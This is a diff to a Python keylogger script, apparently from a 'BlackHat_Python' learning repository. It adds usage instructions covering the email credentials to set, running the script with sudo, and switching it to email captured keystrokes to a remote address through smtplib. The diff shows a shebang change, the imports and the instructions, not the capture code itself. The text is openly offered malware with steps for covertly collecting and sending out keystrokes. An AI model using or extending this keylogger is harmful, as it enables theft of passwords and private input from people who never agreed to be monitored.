@@ -1,4 +1,4 @@
-#!/home/john/Desktop/repos/BlackHat_Python/keyloggers/basic_keylogger/venv/bin/python
+#!/usr/bin/env python
 
 
 # listen to keystrokes in the background
@@ -6,6 +6,28 @@
 # every X number of minutes, write this string to a local file or send in an email
 
 # look into 'keyloggers' module and 'keyboard' module
+
+'''
+    USAGE INSTRUCTIONS:
+1 - modify the 'SEND_INTERVAL', 'EMAIL_ADDRESS', 'EMAIL_PASSWORD' and anything else in this script you want to change.
+
+2 - in this folder, run `pip install -r requirements.txt`. (If this doesn't work, try running `sudo pip install -r requirements.txt`, although this isn't recommended)
+
+3 - run `sudo python3 basic_keylogger.py` NOTE: this script requires 'sudo' to run.
+
+4 - once the SEND_INTERVAL has been reached, a log file will be generated in this folder.
+
+5 - if you want the logs emailed to you instead, you'll need to change __main__ to the following:
+
+if __name__ == "__main__":
+    keylogger = Keylogger(interval=SEND_INTERVAL, report_method="email")
+    keylogger.start()
+
+(NOTE: there's a few other parts of this script that may also need to be changed, depending on the email server you're using. See 'prepare_mail()' and 'sendmail()' below for more info. )
+
+
+'''
+
 
 import keyboard
 import smtplib      # used for emailing the keylogs
